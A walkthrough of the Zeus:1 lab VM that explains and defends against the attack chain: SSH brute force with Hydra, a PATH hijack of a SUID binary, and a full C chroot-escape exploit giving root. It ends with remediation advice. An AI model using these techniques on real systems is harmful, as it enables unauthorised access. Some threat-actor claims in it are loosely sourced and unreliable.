# VulnHub Zeus:1 — Escaping the Olympian Jail

Look at this guys!! Who would have thought that a _restricted shell_ inside a Jailkit chroot could be the final boss of a CTF? Zeus:1 is one of those VMs that legit messes with your head: you get credentials fast, you pop SSH fast, and then you realize you are in a cage. fr fr, this one taught me more about PATH hijacking and chroot internals than any textbook ever did.

Huge thanks to **Vasile Revnic** for building a machine that blends real-world security concepts (Jailkit, SUID, chroot escapes) into a satisfying boot2root challenge. This one hits different, bruh.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | Zeus:1 |
| **Attacker VM** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/zeus-1,598/ |
| **Techniques** | Host discovery, Nmap, FTP anonymous login, dirb, HTML comment leak, Hydra SSH brute force, Jailkit jail shell analysis, SUID binary PATH hijack, chroot escape (C exploit), privilege escalation |
| **CVEs** | CVE-2011-2523 (vsftpd 2.3.4 backdoor, present on banner but not the attack path), no specific CVE for Jailkit escape |

> **Hints from the author:**
> Static IP 192.168.131.0/24 subnet. Goals: read user.txt and root.txt.

---

## Attack Summary

```
[VMware host-only network setup: 192.168.131.0/24]
    |
    v
[nmap: 21/ftp (vsftpd 2.3.4), 22/ssh, 80/http (Apache 2.4.7)]
    |
    v
[FTP anonymous login -> empty session, dead end]
    |
    v
[dirb: /backups + /telecom discovered]
    |
    v
[/telecom source code: <!-- the website will be updated by gogu --> -> username: gogu]
    |
    v
[dirsearch: /backups/backups.tar.gz (GPG-encrypted, rabbit hole)]
    |
    v
[Hydra SSH brute force: gogu:universal]
    |
    v
[SSH login -> Jailkit restricted chroot shell (limited commands)]
    |
    v
[home dir enum: user.txt flag + sysdate SUID binary]
    |
    v
[cat sysdate reveals relative "date" call -> PATH hijack opportunity]
    |
    v
[compile unchroot.c on Kali (-static -m32), transfer via SSH]
    |
    v
[echo "/home/gogu/unchroot" > date; export PATH=/home/gogu:$PATH; ./sysdate]
    |
    v
[chroot escape fires -> root shell outside jail]
    |
    v
[python pty spawn -> /root/root.txt]
```

---

## Methodology

1. Network configuration: VMware host-only, static 192.168.131.0/24
2. Service enumeration with Nmap (FTP, SSH, HTTP)
3. FTP anonymous login test and web application enumeration
4. Hidden directory discovery with dirb and dirsearch
5. Username disclosure via HTML developer comment in /telecom
6. SSH credential brute force with Hydra against user gogu
7. Jailkit restricted shell analysis and SUID binary inspection
8. PATH hijack: fake `date` binary pointing to chroot-escape compiled exploit
9. Privilege escalation: chroot escape gives root outside the jail

---

## Step 1 — Network Setup and Target Identification

The author ships Zeus:1 with a static IP on the 192.168.131.0/24 subnet. That means you need to match your VMware virtual network to that range before anything talks to anything.

In VMware Virtual Network Editor: create or edit a host-only network with Subnet IP `192.168.131.0` and Subnet Mask `255.255.255.0`. Set both the attacker (Kali) and Zeus VMs to use that host-only adapter.

Once both machines are up, verify the target is reachable:

```bash
route -n
# Confirm your Kali interface is on 192.168.131.x

ping 192.168.131.170
# Should respond from Zeus
```

If you want to discover the IP dynamically (useful when DHCP is on):

```bash
arp-scan --localnet --ignoredups
# or
nmap -sn -T5 192.168.131.0/24
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

No mystery here: full-port scan with aggressive detection to see what Zeus is running.

```bash
nmap -A -T4 -p- 192.168.131.170
# -A: OS detection, version detection, NSE scripts, traceroute
# -T4: aggressive timing (safe in isolated lab)
# -p-: all 65535 ports
```

Expected output (key lines):

```
21/tcp open  ftp     vsftpd 2.0.8 or later (banner: v2.3.4)
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

**Noice.** Three attack surfaces. Let's triage:

- **FTP 21**: vsftpd banner says 2.3.4. That version is infamous for CVE-2011-2523 (a backdoor triggered by a smiley-face `:)` in the username). Worth noting, but the anonymous login test comes first.
- **SSH 22**: OpenSSH 6.6.1. No known exploitable CVE here that is practical without creds.
- **HTTP 80**: Apache 2.4.7 on Ubuntu. This is where we will find the username.

> **Real-world note:** vsftpd 2.3.4 (CVE-2011-2523) was a maliciously injected backdoor in a compromised source tarball in 2011. The backdoor opens a shell on port 6200 when a username ending with `:)` is sent. While present as a banner here, this path does not lead to root in this VM. Real pentesters always note CVEs even when they end up being non-exploitable in the specific context. Reference: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Step 3 — FTP Anonymous Login Test

The Nmap scan already hints at anonymous FTP. Let's confirm:

```bash
ftp 192.168.131.170
# Name: ftp
# Password: ftp
```

Expected:

```
230 Login successful.
Remote system type is UNIX.
ftp> ls
```

You will find an empty directory. Zero loot. ಠ_ಠ

SearchSploit for vsftpd also returns nothing actionable for this exact context. Dead end for now. Let's pivot to HTTP.

> **MITRE ATT&CK:** [T1078 Valid Accounts] [T1133 External Remote Services]

---

## Step 4 — Web Enumeration and Username Disclosure

Browse to `http://192.168.131.170`. The homepage looks sus: not much there. Check the page source (Ctrl+U in any browser) because developers love leaving breadcrumbs.

Not much in the main page source. Time for automated directory enumeration:

```bash
dirb http://192.168.131.170 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
# Fast wordlist to get quick wins first
```

Expected discovery:

```
+ http://192.168.131.170/backups (CODE:301)
+ http://192.168.131.170/telecom (CODE:301)
```

Bussin discovery, dude! Two hidden directories. Browse to both:

- `/backups`: renders empty, page source is empty too.
- `/telecom`: also renders nothing visible. But the **page source** says it all:

```html
<!-- the website will be updated by gogu -->
```

Jackpot. We have a username: **gogu**. ( ͡° ͜ʖ ͡°)

> **O que é information disclosure via HTML comments?**
> Developers sometimes leave comments in HTML intended for internal use, such as TODO notes, usernames, internal paths, or API endpoints. These comments are invisible in the rendered browser view but trivially visible in the page source. OWASP classifies this under A05:2021 Security Misconfiguration.
> Reference: https://owasp.org/www-project-top-ten/

Now let's dig deeper into `/backups`. A short wordlist might have missed files:

```bash
dirsearch -u http://192.168.131.170/backups -x 403,404,500 -e php,html,txt,jpg,gif,png,zip,tar,gz -rR 5
```

This finds `backups.tar.gz`. Download it. When you try to extract it:

```bash
tar -xzvf backups.tar.gz
# gzip: stdin: not in gzip format
```

```bash
file backups.tar.gz
# backups.tar.gz: GPG symmetrically encrypted data (AES256 cipher)
```

Rekt. It is GPG-encrypted. This is a rabbit hole. (⊙_☉) We will need a passphrase. The MD5 from user.txt decodes to `1092124305` but that does not decrypt the backup either. Classic CTF trap: this file exists purely to waste your time.

**Tip:** you can also use `gobuster dir -u http://192.168.131.170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` instead of dirb for the same result.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Step 5 — SSH Credential Brute Force

We have a username: `gogu`. Time to hit SSH with the legendary rockyou wordlist.

```bash
hydra -l gogu -P /usr/share/wordlists/rockyou.txt 192.168.131.170 ssh -I -F
# -l: single username
# -P: password wordlist
# -I: ignore existing restore file
# -F: stop on first valid credential
```

Expected output:

```
[22][ssh] host: 192.168.131.170   login: gogu   password: universal
```

**Credentials: gogu:universal** ᕕ( ᐛ )ᕗ

You can also use Medusa as an alternative:

```bash
medusa -h 192.168.131.170 -u gogu -P /usr/share/wordlists/rockyou.txt -M ssh
```

> **Real-world note:** SSH brute force with credential stuffing is a daily occurrence. APT41 (a Chinese threat actor attributed to state-sponsored operations) regularly uses SSH brute force against exposed administrative services as part of initial access operations. Reference: https://attack.mitre.org/groups/G0096/

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1110.003 Brute Force: Password Spraying] [TA0001 Initial Access] [T1021.004 Remote Services: SSH]

---

## Step 6 — Initial Access: Jailkit Restricted Shell

```bash
ssh gogu@192.168.131.170
# Password: universal
```

We are in. But something is off. ლ(ಠ_ಠლ)

Try running basic commands:

```bash
id
# -rbash: id: command not found

python
# not found

bash
# not found
```

But these work: `ls`, `cat`, `cd`, `echo`. We are inside a **Jailkit restricted shell** (chroot jail).

```bash
cat /etc/passwd
# only root and gogu
```

The giveaway:

```bash
ls /etc/
# ...
# jailkit  <- there it is
```

> **O que e Jailkit?**
> Jailkit is a set of utilities that limits user accounts to specific files using `chroot()`. It creates a secondary environment (the "jail") with a minimal set of binaries, preventing the jailed user from accessing the real system. It is used in production by ISPs, enterprise SSH gateways, and embedded security devices.
> Reference: https://olivier.sessink.nl/jailkit/

Enumerate what we have inside the jail:

```bash
ls -la ~
# user.txt
# hackme (suspicious binary, probably a rabbit hole)
# ..../sysdate (hidden in a "..." directory)
```

Read the first flag:

```bash
cat ~/user.txt
# 153a1d7d664309c3c3a553a06633ab5c
```

The `hackme` binary: tested it, ran it, it outputs nothing useful. Pure rabbit hole. (⊙_☉) Moving on.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1082 System Information Discovery]

---

## Step 7 — SUID Binary Discovery and PATH Hijack Analysis

In the hidden `~/...` directory, there is a SUID binary named `sysdate`.

```bash
ls -la ~/...
# ---s--x--x  1 root root   sysdate
```

That `-s` means SUID: it runs as root regardless of who executes it. 

What does it do?

```bash
# Inside the jail, 'strings' is not available
# But 'cat' works and can leak string data from binaries

cat ~/.../.../sysdate
# ...garbled binary...
# ...date | grep EEST...
```

The string `date` appears without an absolute path. This means `sysdate` calls the `date` binary by **relative name**, trusting whatever the `$PATH` environment variable resolves first.

To confirm from Kali (transfer the binary out):

```bash
# On the jail:
ssh root@192.168.131.128 "cat > sysdate" < /home/gogu/.../sysdate

# On Kali, analyze:
strings sysdate | grep date
# date | grep EEST
```

Confirmed. The binary calls `date` relatively. This is our escalation vector. ( ͡° ͜ʖ ͡°)

> **O que e PATH hijacking?**
> When a program calls another binary by its short name (e.g., `date` instead of `/bin/date`), the OS searches through every directory listed in the `$PATH` environment variable in order. If an attacker controls a directory that appears first in `$PATH`, they can place a malicious script named `date` there. The SUID binary will execute the attacker's script with elevated privileges.
> Reference: https://attack.mitre.org/techniques/T1574/007/

> **Real-world note:** PATH hijacking via SUID binaries is documented in multiple enterprise Linux compromises. FIN7, the financially motivated threat actor, has used PATH manipulation as part of post-exploitation privilege escalation on Linux hosts. Reference: https://attack.mitre.org/groups/G0046/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1574.007 Path Interception by PATH Environment Variable] [T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid]

---

## Step 8 — Compiling the Chroot Escape Exploit

Before we do the PATH hijack, we need something to actually break us out of the chroot jail. A plain `/bin/sh -i` via PATH hijack will still give us a root shell _inside the jail_.

We need the chroot-escape technique: a C program that uses `chroot()` + `chdir("..")` to walk up above the jail root and then respawns `/bin/sh` in the real filesystem.

On your **Kali machine** (not inside the jail), create the exploit:

```bash
vi unchroot.c
```

```c
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int dir_fd, x;
    setuid(0);
    mkdir(".42", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot(".42");
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
    return execl("/bin/sh", "-i", NULL);
}
```

Compile as a static 32-bit binary (matches the target architecture):

```bash
gcc -static -o unchroot unchroot.c -m32
# -static: no shared library dependencies (works in minimal jail env)
# -m32: target is 32-bit Linux
```

> **MITRE ATT&CK:** [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Step 9 — Transferring the Exploit to the Target

Two methods. Use whichever fits your setup:

**Method 1: Direct SSH stdin redirect (simplest)**

```bash
# On Kali (attacker), pipe the binary through SSH:
ssh gogu@192.168.131.170 "cat > unchroot" < unchroot
```

**Method 2: cpio over SSH**

```bash
find ./unchroot -xdev -print | cpio -o -Bav -H crc | ssh gogu@192.168.131.170 'pwd; cpio -i -vumd'
```

Inside the jail, verify and set permissions:

```bash
ls -la ~/unchroot
chmod +x ~/unchroot
```

> **MITRE ATT&CK:** [T1105 Ingress Tool Transfer]

---

## Step 10 — PATH Hijack: Escape Jail and Get Root

Now put it all together. Three commands:

```bash
# 1. Create a fake "date" script that runs our unchroot exploit
echo "/home/gogu/unchroot" > /home/gogu/date

# 2. Make it executable and prepend our directory to PATH
chmod +x /home/gogu/date
export PATH=/home/gogu:$PATH

# 3. Execute the SUID binary: it calls "date", finds our fake one, runs unchroot as root
/home/gogu/.../sysdate
```

If stdout is weird, append `1<&2` to redirect:

```bash
/home/gogu/.../sysdate 1<&2
```

(☞ﾟヮﾟ)☞ **Got root outside the jail!**

Spawn a proper PTY for comfort:

```bash
python -c "import pty; pty.spawn('/bin/bash')" 1<&2
```

Read the root flag:

```bash
cat /root/root.txt
```

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid] [T1574.007 Path Interception by PATH Environment Variable] [T1611 Escape to Host]

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Flag 1 (MD5) | `153a1d7d664309c3c3a553a06633ab5c` | `~/user.txt` | Decodes to `1092124305` (not used in exploit path) |
| Credential | `gogu:universal` | Hydra SSH brute force | SSH login |
| Root flag | See `/root/root.txt` | `/root/root.txt` | Final objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Username disclosed in HTML comment | Developer notes in production code expose usernames for targeted brute force | Strip all comments and debug info from production HTML |
| 2 | Weak SSH password (`universal`) | Password spraying/brute force is one of the most common initial access techniques against exposed SSH | Enforce strong passwords, use key-based auth, consider fail2ban or port knocking |
| 3 | SUID binary calling `date` by relative path | Any SUID binary calling external tools by relative name is a privilege escalation risk on any Linux host | Always use absolute paths in SUID/sudo-accessible programs |
| 4 | Jailkit chroot escape via `chdir("..")` loop | Chroot by itself is not a security boundary: without proper process sandboxing, it can be escaped | Combine chroot with seccomp, AppArmor, or container isolation for defense-in-depth |

**Why does this matter outside the lab?**

SSH credential brute force accounts for a significant percentage of initial access in real-world breaches. The 2021 SolarWinds-adjacent attacks and numerous ransomware groups (LockBit, BlackCat) use exposed SSH with weak credentials as day-one entry. The Jailkit escape technique maps directly to CVE-class issues in restricted shell products: several commercial network devices have shipped with jailbroken SSH environments that could be escaped using precisely this `chdir` method. For blue teams: Jailkit is used legitimately by ISPs and enterprise SSH gateways. If you find it in a network scan, probe it.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Credential Access | TA0006 | Brute Force: Password Spraying | T1110.003 |
| Initial Access | TA0001 | External Remote Services (SSH) | T1133 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Defense Evasion | TA0005 | Path Interception by PATH Environment Variable | T1574.007 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |
| Privilege Escalation | TA0004 | Path Interception by PATH Environment Variable | T1574.007 |
| Privilege Escalation | TA0004 | Escape to Host | T1611 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Remove all developer comments, usernames, and internal paths from production HTML before deployment.
2. Enforce strong SSH passwords or, better, disable password authentication entirely and use key-based auth.
3. Replace the SUID `sysdate` binary to call `/bin/date` (absolute path) instead of `date`.
4. Keep Jailkit updated and combine it with `seccomp` or AppArmor profiles to prevent `chroot()` system calls from jail processes.
5. Audit all SUID binaries regularly: `find / -perm -u=s -type f 2>/dev/null` should be part of every Linux hardening runbook.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the host from the network if an active compromise is suspected.
- Rotate credentials for any account that could have been brute forced.
- Review SSH authentication logs for repeated failures: `grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn`.
- Audit all SUID binaries on the host.

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) for T1110.003 Brute Force
- D3-IVA (Input Validation) for T1059.004 Command Injection paths
- D3-OPS (OS Process Sandboxing) for T1548.001 SUID Abuse
- D3-DA (Dynamic Analysis) for T1574.007 PATH Hijacking

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all SUID binaries and SSH-accessible accounts.
- Protect (PR.AC-4): Implement privileged access management; enforce MFA for SSH.
- Detect (DE.CM-1): Monitor authentication logs for brute force patterns.
- Respond (RS.AN): Investigate root-level access events with forensic timeline reconstruction.
- Recover (RC.RP): Rotate credentials and rebuild affected systems after confirmed compromise.

**NIST SP 800-53 (Rev. 5) Controls:**
- IA-5: Authenticator Management (enforce strong SSH passwords or keys)
- AC-6: Least Privilege (remove unnecessary SUID bits)
- SI-2: Flaw Remediation (keep vsftpd and Jailkit updated)
- AU-2: Event Logging (log SSH authentication attempts)
- CM-7: Least Functionality (disable anonymous FTP if unused)

**CISA Known Exploited Vulnerabilities:**
- CVE-2011-2523 (vsftpd 2.3.4 backdoor): present in the CISA KEV catalog. Not the attack path here but the service version warrants immediate patching.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS
- Practice: Identity and Access Management
- Target MIL: MIL-2 (managed access controls, multi-factor authentication, regular access reviews)

---

## Final Thoughts

Thanks to **Vasile Revnic** for building Zeus:1 with layers that actually teach something! The GPG-encrypted backup as a rabbit hole is a clever troll. The Jailkit + SUID PATH hijack combo is legitimately something you would encounter on a hardened SSH jumpbox or an ISP shell server.

This VM is a masterclass in one core principle: a restricted environment is only as strong as every binary inside it. One relative path call in a SUID binary is all it takes to unwind everything. For LPI certification candidates: chroot and Jailkit concepts appear in the exam objectives, so this VM doubles as practical study material.

If this walkthrough helped you, share it with your crew and keep hacking. nailed it gg

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/uniaogeek/vulnhub-zeus-1-walkthrough

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
